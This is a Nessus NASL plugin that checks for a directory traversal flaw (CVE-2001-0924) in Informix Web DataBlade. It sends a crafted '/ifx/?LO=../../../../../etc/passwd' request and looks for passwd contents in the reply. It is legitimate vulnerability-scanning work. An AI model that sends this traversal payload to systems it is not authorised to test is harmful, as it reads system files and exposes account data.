#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10805);
 script_bugtraq_id(3575);
 script_cve_id("CVE-2001-0924");
 script_version ("$Revision: 1.12 $");
 
 name["english"] = "Informix traversal";
 name["francais"] = "Informix traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The Web DataBlade modules for Informix
SQL allows an attacker to read arbitrary files on
the remote system by sending a specially crafted
request, like :

	GET /ifx/?LO=../../../../file

Solution : Disable this module
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "/ifx/?LO=../../../file";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 req = string("/ifx/?LO=../../../../../etc/passwd");
 rq = http_get(item:req, port:port);
 res = http_keepalive_send_recv(port:port, data:rq);
 if ( res == NULL ) exit(0);
 if (egrep(pattern:"root:.*0:[01]:.*", string:res)) security_hole(port);
}
